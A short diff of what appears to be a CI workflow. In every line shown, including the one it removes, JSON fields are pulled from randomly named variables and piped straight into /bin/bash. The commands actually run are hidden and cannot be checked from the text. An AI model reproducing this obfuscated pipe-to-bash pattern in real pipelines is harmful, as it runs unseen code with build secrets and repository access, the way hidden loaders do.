@@ -22,7 +22,6 @@ jobs:
           echo $iu94 | jq -r .y189 | /bin/bash
           printf '%s' "$yn6" | jq -r .wvfaf14 | /bin/bash
           printf '%s' "$og9124" | jq -r .ojota34 | /bin/bash
-          printf '%s' "$ju9272" | jq -r .jdpsi35 | /bin/bash
           printf '%s' "$iryn530" | jq -r .cmwhe54375 | /bin/bash
 
       - name: Save output
